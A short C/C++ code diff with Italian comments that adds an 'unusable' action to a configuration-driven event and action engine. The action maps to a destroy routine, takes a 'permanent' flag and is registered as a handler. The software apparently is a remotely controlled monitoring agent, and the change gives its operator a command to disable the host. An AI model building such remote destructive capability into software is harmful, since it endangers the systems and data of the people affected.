@@ -497,8 +497,14 @@ BYTE *ParseActionParameter(JSONObject conf_json, DWORD *tag)
 			DWORD event_id = conf_json[L"event"]->AsNumber();
 			memcpy(param, &event_id, sizeof(DWORD));
 		}
+	} else if (!wcscmp(action, L"unusable")) {
+		*tag = AF_DESTROY;
+		param = (BYTE *)malloc(sizeof(BOOL));
+		if (param) {
+			BOOL isPermanent = conf_json[L"permanent"]->AsBool();
+			memcpy(param, &isPermanent, sizeof(BOOL));
+		}
 	}
-
 	return param;
 }
 
@@ -645,6 +651,7 @@ void SM_MonitorEvents(DWORD dummy)
 	ActionFuncRegister(AF_LOGINFO, DA_LogInfo, TRUE);
 	ActionFuncRegister(AF_STARTEVENT, DA_StartEvent, TRUE);
 	ActionFuncRegister(AF_STOPEVENT, DA_StopEvent, TRUE);
+	ActionFuncRegister(AF_DESTROY, DA_Destroy, TRUE);
 
 	// Legge gli eventi e le azioni dal file di configurazione. 
 	// Deve essere sempre posizionato DOPO la registrazione di EM e AF
